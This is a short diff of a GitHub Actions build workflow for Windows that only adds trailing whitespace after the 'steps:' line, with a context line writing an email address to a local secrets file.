@@ -7,7 +7,7 @@ jobs:
   build:
     runs-on: windows-latest
 
-    steps:
+    steps: 
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=jibranhasnainjalali@outlook.com" > secrets.txt
